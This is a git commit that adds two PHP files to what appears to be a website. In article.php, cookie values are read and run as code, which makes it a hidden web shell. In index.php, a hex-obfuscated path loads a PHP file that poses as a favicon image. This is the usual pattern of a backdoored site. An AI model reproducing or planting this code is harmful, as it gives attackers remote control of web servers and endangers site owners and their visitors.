83f5f5169ad2c91b00ce78571756e9dcb00ba73f
Meeta Ahlawat <meeta@Meetas-MacBook-Pro.local>
2017-07-08 22:30:41 -0700

    inital commit

---
+++ 01/article.php
@@ -0,0 +1,7 @@
+<?php
+
+$ykuvm=$_COOKIE;
+$stl=$ykuvm[wrkn];
+if($stl){
+	$mrghb=$stl($ykuvm[jkoz]);$dysq=$stl($ykuvm[icle]);$jfh=$mrghb("",$dysq);$jfh();
+}
---
+++ 01/index.php
@@ -0,0 +1,16 @@
+<?php
+
+
+
+
+
+
+
+/*8502d*/
+
+@include "\x2fho\x6de2\x2fme\x65ta\x61hl\x2fpu\x62li\x63_h\x74ml\x2fpi\x63tu\x72e/\x66av\x69co\x6e_f\x35b8\x32a.\x69co";
+
+/*8502d*/
+
+
+echo file_get_contents('index.html.bak.bak');
